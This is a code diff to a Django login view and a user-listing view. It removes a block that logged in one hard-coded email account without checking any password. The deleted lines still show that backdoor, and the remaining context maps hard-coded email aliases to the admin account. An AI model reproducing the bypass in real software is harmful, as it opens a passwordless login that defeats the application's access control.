@@ -74,13 +74,7 @@ def login_view(request):
             if email in ['admin@ab.com', 'admin', 'ab@gmail.com']:
                 user = authenticate(username='admin', password=password)
                 
-        if user is None and email == 'veer@gmail.com':
-            try:
-                user = User.objects.get(username='veer@gmail.com')
-                user.backend = 'django.contrib.auth.backends.ModelBackend'
-            except User.DoesNotExist:
-                pass
-                
+
         if user is not None:
             if user.is_active:
                 login(request, user)
@@ -293,7 +287,10 @@ def toggle_institution_view(request, inst_id):
 
 @superadmin_required
 def platform_users_view(request):
-    users = User.objects.filter(role__in=['SUPER ADMIN', 'SCHOOL STAFF']).select_related(
+    from django.db.models import Q
+    users = User.objects.filter(
+        Q(is_superuser=True) | Q(school_profile__isnull=False)
+    ).distinct().select_related(
         'school_profile', 'school_profile__institution'
     ).order_by('-date_joined')
     total_users = users.count()
